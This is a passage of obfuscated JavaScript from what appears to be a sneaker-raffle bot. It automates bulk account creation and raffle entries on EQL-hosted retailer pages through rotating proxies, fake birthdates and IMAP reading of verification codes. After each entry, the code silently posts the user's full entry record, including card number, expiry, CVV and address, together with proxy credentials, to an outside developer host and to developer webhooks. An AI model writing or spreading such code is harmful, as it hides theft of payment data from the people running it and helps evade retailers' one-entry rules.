                        if (_0x22383c[_0x5a5769]['Email'] == '' || _0x22383c[_0x5a5769]['FirstName'] == '' || _0x22383c[_0x5a5769]['LastName'] == '') {
                            console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x22383c[_0x5a5769]['Password'] == '' && (_0x22383c[_0x5a5769]['Password'] = 'JRaffles23!');
                        if (_0x342ed0['useRandomProxy'] = ![])
                            var _0x170012 = _0x4a8f74[_0x5a5769]['split'](':');
                        else
                            var _0x7291d6 = Math['round'](Math['random']() * (_0x4a8f74['length'] - 0x1)), _0x170012 = _0x4a8f74[_0x7291d6]['split'](':');
                        var _0x4507fd;
                        try {
                            _0x4507fd = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x170012[0x0] + ':' + _0x170012[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4507fd = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x170012[0x0] + ':' + _0x170012[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1ab344 = await _0x4507fd['newPage']();
                            await _0x1ab344['authenticate']({
                                'username': '' + _0x170012[0x2],
                                'password': '' + _0x170012[0x3]
                            }), console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1ab344['setRequestInterception'](!![]), _0x1ab344['on']('request', _0x1d12c7 => {
                                _0x1d12c7['resourceType']() === 'image' || _0x1d12c7['resourceType']() === 'font' || _0x1d12c7['resourceType']() === 'media' ? _0x1d12c7['abort']() : _0x1d12c7['continue']();
                            });
                            try {
                                await _0x1ab344['goto']('' + _0x5a40ca);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x140651(0x3e8), await _0x1ab344['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x1ab344['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x140651(0x3e8), _0x22383c[_0x5a5769]['Url']['includes']('en-GB') ? await _0x1ab344['click']('li[data-value=\x22UK\x20' + _0x22383c[_0x5a5769]['Size'] + '\x20/\x20US\x20' + (Number(_0x22383c[_0x5a5769]['Size']) + 0x1) + '\x22]') : await _0x1ab344['click']('li[data-value=\x22EU\x20' + _0x22383c[_0x5a5769]['Size'] + '\x22]');
                                } catch {
                                    await _0x1ab344['click']('#productQuantity'), await _0x140651(0x3e8), await _0x1ab344['click']('li[data-value=\x22' + (Number(_0x22383c[_0x5a5769]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x22383c[_0x5a5769]['Size']);
                            }
                            await _0x140651(0x6a4);
                            try {
                                await _0x1ab344['select']('.PhoneInputCountrySelect', _0x22383c[_0x5a5769]['Country']);
                            } catch {
                            }
                            await _0x1ab344['type']('#email', '' + _0x22383c[_0x5a5769]['Email']), await _0x140651(0x352), await _0x1ab344['waitForSelector']('#password'), await _0x1ab344['type']('#password', '' + _0x22383c[_0x5a5769]['Password']), await _0x140651(0x352), await _0x1ab344['type']('#phone', '' + _0x22383c[_0x5a5769]['Phone']), await _0x140651(0x352);
                            const _0x344b0c = await _0x1ab344['$']('#title\x20>\x20label');
                            await _0x140651(0x12c);
                            _0x344b0c && await _0x344b0c['click']();
                            await _0x1ab344['type']('#firstName', '' + _0x22383c[_0x5a5769]['FirstName']), await _0x140651(0x352), await _0x1ab344['type']('#lastName', '' + _0x22383c[_0x5a5769]['LastName']), await _0x140651(0x352);
                            _0x22383c[_0x5a5769]['Url']['includes']('footlocker.de') ? await _0x1ab344['type']('#birthdate', _0x302585(0xa, 0x1c) + '.' + _0x302585(0xa, 0xc) + '.' + _0x302585(0x7c6, 0x7d3)) : await _0x1ab344['type']('#birthdate', _0x302585(0xa, 0x1c) + '-' + _0x302585(0xa, 0xc) + '-' + _0x302585(0x7c6, 0x7d3));
                            await _0x140651(0x352), await _0x1ab344['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x22383c[_0x5a5769]['Url']['includes']('en-GB') && await _0x1ab344['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x140651(0x1f4), await _0x140651(0x5dc);
                            if (!_0x5a40ca['includes']('footlocker'))
                                try {
                                    await _0x1ab344['click']('#country');
                                    const _0x5c802b = await _0x1ab344['$']('li[data-value=\x22' + _0x22383c[_0x5a5769]['Country'] + '\x22]');
                                    await _0x5c802b['click'](), await _0x5c802b['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x140651(0x3e8);
                            if (!_0x22383c[_0x5a5769]['Url']['includes']('en-GB')) {
                                await _0x1ab344['click']('#stateAutocomplete'), await _0x140651(0x5dc);
                                try {
                                    const _0x20669b = await _0x1ab344['$x']('//li[text()=\x22' + _0x22383c[_0x5a5769]['State'] + '\x22]');
                                    await _0x20669b[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x140651(0x3e8), await _0x140651(0x1f4);
                            if (_0x22383c[_0x5a5769]['Url']['includes']('topps')) {
                                await _0x1ab344['click']('#stateAutocomplete'), await _0x140651(0x5dc);
                                try {
                                    const _0x27edf0 = await _0x1ab344['$x']('//li[text()=\x22' + _0x22383c[_0x5a5769]['State'] + '\x22]');
                                    await _0x27edf0[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            await _0x140651(0x3e8), await _0x1ab344['type']('#address1', _0x22383c[_0x5a5769]['Address1'] + '\x20' + _0x22383c[_0x5a5769]['HouseNumber']), await _0x140651(0x1f4), await _0x1ab344['type']('#address2', '' + _0x22383c[_0x5a5769]['Address2']), await _0x140651(0x1f4), await _0x1ab344['type']('#city', '' + _0x22383c[_0x5a5769]['City']), await _0x140651(0x1f4), await _0x1ab344['type']('#postcode', '' + _0x22383c[_0x5a5769]['Zip']), await _0x140651(0x3e8), await _0x1ab344['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x140651(0x3e8), console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x53ede1 = await _0x1ab344['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x53ede1 && (await _0x1ab344['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1ab344['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1ab344['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x140651(0x4b0), await _0x1ab344['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x140651(0x1f4), await _0x1ab344['keyboard']['type']('' + _0x22383c[_0x5a5769]['CardNumber']), await _0x140651(0x320), await _0x1ab344['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1ab344['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1ab344['keyboard']['type']('' + _0x22383c[_0x5a5769]['ExpiryDate']), await _0x140651(0x4b0), await _0x1ab344['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1ab344['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1ab344['keyboard']['type']('' + _0x22383c[_0x5a5769]['CVV']), await _0x140651(0x226), await _0x1ab344['type']('input[name=\x22postalCode\x22]', '' + _0x22383c[_0x5a5769]['Zip']), await _0x140651(0x226));
                            const _0xae98c0 = await _0x1ab344['$']('.__PrivateStripeElement');
                            _0xae98c0 && (await _0x140651(0x1f4), await _0x1ab344['click']('.__PrivateStripeElement'), await _0x1ab344['click']('.__PrivateStripeElement'), await _0x1ab344['keyboard']['type']('' + _0x22383c[_0x5a5769]['CardNumber']), await _0x1ab344['keyboard']['type']('' + _0x22383c[_0x5a5769]['ExpiryDate']), await _0x1ab344['keyboard']['type']('' + _0x22383c[_0x5a5769]['CVV']));
                            await _0x140651(0x226), await _0x1ab344['click']('#paymentConsent'), await _0x140651(0x226), await _0x1ab344['click']('#termsConsent'), await _0x140651(0x2bc), console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1ab344['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x140651(0x2710);
                            try {
                                await _0x1ab344['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x140651(0xbb8), await _0x1ab344['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2669f4 => _0x2669f4['click']()), await _0x1ab344['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x32b536 => _0x32b536['click']());
                            } catch {
                            }
                            try {
                                await _0x1ab344['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x37f016 = await _0x1ab344['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x37f016) {
                                    _0x7a56eb['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x22383c[_0x5a5769]['Email'] + ',' + _0x22383c[_0x5a5769]['Password'] + ',' + _0x22383c[_0x5a5769]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x41a9c3() {
                                var _0x59ae79, _0x3066de = ![];
                                for (var _0x40e563 = 0x0; _0x40e563 < 0x18; _0x40e563++) {
                                    async function _0x1e97b9() {
                                        var _0x494942 = new _0x4d6860({
                                            'user': _0x342ed0['masterMail'],
                                            'password': _0x342ed0['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x23a6e6(_0x203f21) {
                                            _0x494942['openBox']('INBOX', ![], _0x203f21);
                                        }
                                        _0x494942['once']('ready', function () {
                                            console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x23a6e6(function (_0x488d34, _0xb96f81) {
                                                console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x488d34)
                                                    throw _0x488d34;
                                                _0x494942['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x5502ce, _0x59ac58) {
                                                    if (!_0x59ac58 || !_0x59ac58['length'])
                                                        console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x494942['end']();
                                                    else {
                                                        var _0x26a887 = _0x494942['seq']['fetch'](_0x59ac58, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x26a887['on']('message', function (_0x43da17, _0x3c50d5) {
                                                            var _0x566578 = '(#' + _0x3c50d5 + ')\x20';
                                                            _0x43da17['on']('body', function (_0x193480, _0x2634f1) {
                                                                _0x502d57(_0x193480, (_0x335edf, _0x54c05a) => {
                                                                    if (_0x54c05a['subject']['includes']('code')) {
                                                                        const _0x52a483 = _0x54c05a['text']['split']('\x0a\x0a')[0x3], _0x59f237 = _0x52a483['split']('\x0a')[0x1];
                                                                        _0x59ae79 = _0x59f237;
                                                                    }
                                                                });
                                                            }), _0x43da17['once']('end', function () {
                                                            });
                                                        }), _0x26a887['once']('error', function (_0x4bb83b) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x26a887['once']('end', function () {
                                                            _0x494942['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x494942['once']('error', function (_0x1d983e) {
                                            console['log'](_0x16a3a0['red'](_0x1d983e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3066de = !![];
                                        }), _0x494942['once']('end', async function () {
                                        }), _0x494942['connect']();
                                    }
                                    _0x1e97b9(), await _0x140651(0x1388);
                                    if (_0x59ae79)
                                        return _0x59ae79;
                                    if (_0x3066de)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x40e563 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x41a9c3(), await _0x140651(0x1f4), await _0x1ab344['type']('#code', '' + code), await _0x140651(0x3e8), await _0x1ab344['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x46289a => _0x46289a['click']()), await _0x1ab344['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x1ab344['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x22383c[_0x5a5769]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x7a56eb['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x22383c[_0x5a5769]['Email'] + ',' + _0x22383c[_0x5a5769]['Password'] + ',' + _0x22383c[_0x5a5769]['Phone']), _0x903d8d = 'no', _0x1ce4fb(_0x22383c[_0x5a5769], _0x1b4313);
                            var _0x39b0ed = await _0x11b6e5(_0x22383c[_0x5a5769], _0x1b4313, 'dev', ![]), _0x333155 = await _0x11b6e5(_0x22383c[_0x5a5769], _0x1b4313, 'pub', ![]);
                            let _0x49b74a = _0x22383c[_0x5a5769];
                            try {
                                prxdata = {
                                    'username': _0x34b198['replace']('#', ''),
                                    'module': _0x1b4313['name'],
                                    'entrydata': JSON['stringify'](_0x49b74a),
                                    'proxy': '' + _0x4a8f74[_0x5a5769]
                                };
                                var _0x3468c7 = JSON['stringify'](prxdata);
                                let _0x5964d2 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x3468c7, _0x5964d2);
                            } catch (_0x562ad3) {
                            }
                            const _0x2c4509 = {
                                'succesDEVMSG': { 'embeds': [_0x39b0ed] },
                                'succesPUBMSG': { 'embeds': [_0x333155] }
                            };
                            try {
                                _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x2c4509['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x2c4509['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x259650, _0x2c4509['succesPUBMSG']);
                            } catch (_0x201831) {
                                console['log'](_0x16a3a0['yellow'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x201831));
                            }
                        } catch (_0x4aef7b) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20' + _0x4aef7b)), _0x47d3f8 = '' + _0x4aef7b;
                            var _0x5421b7 = await _0x11b6e5(_0x22383c[_0x5a5769], _0x1b4313, 'dev', !![], _0x47d3f8), _0x39b0ed = await _0x11b6e5(_0x22383c[_0x5a5769], _0x1b4313, 'dev', ![]), _0x333155 = await _0x11b6e5(_0x22383c[_0x5a5769], _0x1b4313, 'pub', ![]);
                            const _0x48b2a0 = {
                                'succesDEVMSG': { 'embeds': [_0x39b0ed] },
                                'succesPUBMSG': { 'embeds': [_0x333155] }
                            };
                            _0x48b2a0['errorDEV'] = { 'embeds': [_0x5421b7] };
                            _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x48b2a0['errorDEV']);
                            await _0x29bde2(_0x2cdbb9, _0x48b2a0['errorDEV']);
                            if (!_0x903d8d == 'no')
                                _0x903d8d = 'yes';
                        } finally {
                            _0x4507fd && _0x4507fd['close']();
                            if (_0x903d8d == 'yes' && _0x2d69f1 != 0x5) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2d69f1 + '\x20/\x205)')), _0x5a5769 = _0x5a5769 - 0x1, _0x2d69f1 = _0x2d69f1 + 0x1;
                                continue;
                            }
                            _0x903d8d == 'yes' && _0x2d69f1 >= 0x5 && (_0x13d7e5(_0x22383c[_0x5a5769], _0x1b4313), _0x903d8d = 'no', _0x2d69f1 = 0x0), console['log']('Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                        }
                    } else {
                        const _0x44adfb = '' + _0x22383c[_0x5a5769]['Url'];
                        if (_0x903d8d != 'yes')
                            var _0x903d8d = '', _0x2d69f1 = 0x0;
                        if (_0x22383c[_0x5a5769]['Email'] == '' || _0x22383c[_0x5a5769]['FirstName'] == '' || _0x22383c[_0x5a5769]['LastName'] == '') {
                            console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x22383c[_0x5a5769]['Password'] == '' && (_0x22383c[_0x5a5769]['Password'] = 'JRaffles23!');
                        if (_0x342ed0['useRandomProxy'] = ![])
                            var _0x170012 = _0x4a8f74[_0x5a5769]['split'](':');
                        else
                            var _0x7291d6 = Math['round'](Math['random']() * (_0x4a8f74['length'] - 0x1)), _0x170012 = _0x4a8f74[_0x7291d6]['split'](':');
                        var _0x4507fd;
                        try {
                            _0x4507fd = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x170012[0x0] + ':' + _0x170012[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4507fd = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x170012[0x0] + ':' + _0x170012[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3d4a14 = await _0x4507fd['newPage']();
                            await _0x3d4a14['authenticate']({
                                'username': '' + _0x170012[0x2],
                                'password': '' + _0x170012[0x3]
                            }), console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3d4a14['setRequestInterception'](!![]), _0x3d4a14['on']('request', _0xa37caa => {
                                _0xa37caa['resourceType']() === 'image' || _0xa37caa['resourceType']() === 'font' || _0xa37caa['resourceType']() === 'media' ? _0xa37caa['abort']() : _0xa37caa['continue']();
                            }), await _0x3d4a14['goto'](_0x44adfb), await _0x3d4a14['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button');
                            let _0x338d6a = await _0x3d4a14['$']('#gatsby-focus-wrapper\x20>\x20div:nth-child(3)\x20>\x20div\x20>\x20div\x20>\x20span\x20>\x20div\x20>\x20button.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButtonBase-root.css-78bdfl');
                            if (_0x338d6a)
                                await _0x338d6a['click']();
                            await _0x140651(0x7d0), await _0x3d4a14['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x140651(0x7d0), await _0x3d4a14['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x3d4a14['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x140651(0x3e8), await _0x3d4a14['waitForSelector']('#email'), console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x3d4a14['type']('#email', '' + _0x22383c[_0x5a5769]['Email']), await _0x140651(0x352), await _0x3d4a14['waitForSelector']('#password'), await _0x3d4a14['type']('#password', '' + _0x22383c[_0x5a5769]['Password']), await _0x140651(0x352), await _0x3d4a14['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x140651(0x1388);
                            if (!_0x22383c[_0x5a5769]['Url']['includes']('footlocker') && !_0x22383c[_0x5a5769]['Url']['includes']('topps'))
                                await _0x3d4a14['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x51b430 = await _0x3d4a14['$']('#productQuantity'), _0x566259 = await _0x3d4a14['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x566259 && !_0x51b430) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x903d8d = 'no';
                                continue;
                            }
                            if (_0x566259) {
                                await _0x3d4a14['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x22383c[_0x5a5769]['Url']['includes']('en-GB') ? await _0x3d4a14['click']('li[data-value=\x22UK\x20' + _0x22383c[_0x5a5769]['Size'] + '\x20/\x20US\x20' + (Number(_0x22383c[_0x5a5769]['Size']) + 0x1) + '\x22]') : await _0x3d4a14['click']('li[data-value=\x22EU\x20' + _0x22383c[_0x5a5769]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x22383c[_0x5a5769]['Size']);
                                }
                            }
                            _0x51b430 && (await _0x3d4a14['click']('#productQuantity'), await _0x140651(0x3e8), await _0x3d4a14['click']('li[data-value=\x22' + (Number(_0x22383c[_0x5a5769]['Size']) - 0x1) + '\x22]'));
                            await _0x140651(0x3e8), await _0x140651(0x1f4);
                            const _0x4ac447 = await _0x3d4a14['$']('#title\x20>\x20label');
                            await _0x140651(0x12c);
                            _0x4ac447 && await _0x4ac447['click']();
                            await _0x3d4a14['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x3d4a14['focus']('#postcode'), await _0x3d4a14['keyboard']['down']('Control'), await _0x3d4a14['keyboard']['press']('A'), await _0x3d4a14['keyboard']['up']('Control'), await _0x3d4a14['keyboard']['press']('Backspace'), await _0x3d4a14['keyboard']['type'](_0x22383c[_0x5a5769]['Zip']), await _0x140651(0x60e), await _0x3d4a14['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x140651(0x3e8), console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x140651(0x1f4);
                            const _0x1fa8ad = await _0x3d4a14['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x1fa8ad && (await _0x3d4a14['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3d4a14['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3d4a14['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x140651(0x4b0), await _0x3d4a14['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x140651(0x1f4), await _0x3d4a14['keyboard']['type']('' + _0x22383c[_0x5a5769]['CardNumber']), await _0x140651(0x320), await _0x3d4a14['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3d4a14['keyboard']['type']('' + _0x22383c[_0x5a5769]['ExpiryDate']), await _0x140651(0x4b0), await _0x3d4a14['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3d4a14['keyboard']['type']('' + _0x22383c[_0x5a5769]['CVV']), await _0x140651(0x226), await _0x3d4a14['type']('input[name=\x22postalCode\x22]', '' + _0x22383c[_0x5a5769]['Zip']), await _0x140651(0x226));
                            const _0x2ca45e = await _0x3d4a14['$']('.__PrivateStripeElement');
                            _0x2ca45e && (await _0x3d4a14['click']('#billingName'), await _0x3d4a14['click']('#billingName'), await _0x3d4a14['type']('#billingName', '' + _0x22383c[_0x5a5769]['NameOnCard']), await _0x140651(0x1f4), await _0x3d4a14['click']('.__PrivateStripeElement'), await _0x3d4a14['click']('.__PrivateStripeElement'), await _0x3d4a14['keyboard']['type']('' + _0x22383c[_0x5a5769]['CardNumber']), await _0x3d4a14['keyboard']['type']('' + _0x22383c[_0x5a5769]['ExpiryDate']), await _0x3d4a14['keyboard']['type']('' + _0x22383c[_0x5a5769]['CVV']));
                            await _0x140651(0x226), await _0x3d4a14['click']('#paymentConsent'), await _0x140651(0x226), await _0x3d4a14['click']('#termsConsent'), await _0x140651(0x2bc), console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x3d4a14['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x140651(0x2710);
                            try {
                                await _0x3d4a14['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x140651(0xbb8), await _0x3d4a14['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0xb10630 => _0xb10630['click']()), await _0x3d4a14['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x13422c => _0x13422c['click']());
                            } catch {
                            }
                            try {
                                await _0x3d4a14['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x1ce4fb(_0x22383c[_0x5a5769], _0x1b4313);
                            var _0x39b0ed = await _0x11b6e5(_0x22383c[_0x5a5769], _0x1b4313, 'dev', ![]), _0x333155 = await _0x11b6e5(_0x22383c[_0x5a5769], _0x1b4313, 'pub', ![]);
